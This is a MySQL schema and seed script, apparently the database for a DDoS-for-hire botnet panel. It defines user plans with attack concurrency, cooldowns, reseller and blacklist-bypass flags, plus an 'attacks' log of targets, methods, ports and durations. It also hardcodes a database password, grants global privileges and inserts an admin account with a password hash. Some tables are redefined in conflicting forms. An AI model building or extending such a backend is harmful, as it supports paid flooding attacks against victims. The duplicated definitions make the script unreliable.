CREATE DATABASE `Yami`;

USE `Yami`;


CREATE USER 'YamiDB'@'localhost' IDENTIFIED BY 'Yami!995750781099575078109957507810';

GRANT ALL PRIVILEGES ON * . * TO 'YamiDB'@'localhost';

FLUSH PRIVILEGES;

CREATE TABLE `users` (
	`ID` int(10) unsigned NOT NULL AUTO_INCREMENT, 
	`Username` varchar(64), 
	`Password` varchar(128), 
	`MFA` varchar(200) NOT NULL,
	`NewUser` tinyint(1), 
	`Admin` tinyint(1), 
	`Reseller` tinyint(1), 
	`Banned` tinyint(1), 
	`Vip` tinyint(1), 
	`MaxTime` int(10) UNSIGNED DEFAULT NULL, 
	`Cooldown` int(10) UNSIGNED DEFAULT NULL, 
	`Concurrents` int(10) UNSIGNED DEFAULT NULL, 
	`MaxSessions` int(10) UNSIGNED DEFAULT NULL, 
	`PowerSavingExempt` tinyint(1), 
	`BypassBlacklist` tinyint(1), 
	`PlanExpiry` BigInt(20), 
	PRIMARY KEY (`ID`), 
	KEY `username` (`Username`)
);

CREATE TABLE `attacks` (
     `ID` int(10) unsigned NOT NULL AUTO_INCREMENT, 
     `Username` varchar(20) NOT NULL, 
     `Target` varchar(255) NOT NULL, 
     `Method` varchar(20) NOT NULL, 
	 `Type` varchar(20) NOT NULL, 
     `Port` int(11) NOT NULL, 
     `Duration` int(11) NOT NULL, 
     `End` bigint(20) NOT NULL, 
     `Created` bigint(20) NOT NULL, 
     PRIMARY KEY (`ID`),  
     KEY `username` (`Username`)
);


CREATE TABLE `attacks` (`ID` int(10) unsigned NOT NULL AUTO_INCREMENT, `Username` varchar(20) NOT NULL, `Target` varchar(255) NOT NULL, `Method` varchar(20) NOT NULL, `Port` int(11) NOT NULL, `Duration` int(11) NOT NULL, `End` bigint(20) NOT NULL, `Created` bigint(20) NOT NULL, PRIMARY KEY (`ID`),  KEY `username` (`Username`));

CREATE TABLE `users` (`ID` int(10) unsigned NOT NULL AUTO_INCREMENT, `Username` varchar(64), `Password` varchar(128), `NewUser` tinyint(1), `Admin` tinyint(1), `Reseller` tinyint(1), `Banned` tinyint(1), `Vip` tinyint(1), `MaxTime` int(10) UNSIGNED DEFAULT NULL, `Cooldown` int(10) UNSIGNED DEFAULT NULL, `Concurrents` int(10) UNSIGNED DEFAULT NULL, `MaxSessions` int(10) UNSIGNED DEFAULT NULL, `PowerSavingExempt` tinyint(1), `BypassBlacklist` tinyint(1), `PlanExpiry` BigInt(20), PRIMARY KEY (`ID`), KEY `username` (`Username`));


INSERT INTO `users` (`ID`, `Username`, `Password`, `Admin`, `Reseller`, `Banned`, `Vip`, `MaxTime`, `Cooldown`, `Concurrents`, `MaxSessions`, `PowerSavingExempt`, `PlanExpiry`) VALUES (NULL, ?, ?, 0, 0, 0, 1, 1200, 30, 3, 1, 0, ?);

INSERT INTO `users` (`ID`, `Username`, `Password`, `Admin`, `Reseller`, `Banned`, `Vip`, `MaxTime`, `Cooldown`, `Concurrents`, `MaxSessions`) VALUES
(NULL, 'fbv9', '6b616e6b6572e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', 1, 0, 0, 1, 1200, 30, 3, 1);


CREATE TABLE `users` (`ID` int(10) unsigned NOT NULL AUTO_INCREMENT, `Username` varchar(64), `Password` varchar(128), `NewUser` tinyint(1), `Admin` tinyint(1), `Reseller` tinyint(1), `Banned` tinyint(1), `Vip` tinyint(1), `MaxTime` int(10) UNSIGNED DEFAULT NULL, `Cooldown` int(10) UNSIGNED DEFAULT NULL, `Concurrents` int(10) UNSIGNED DEFAULT NULL, `MaxSessions` int(10) UNSIGNED DEFAULT NULL, PRIMARY KEY (`ID`), KEY `username` (`Username`));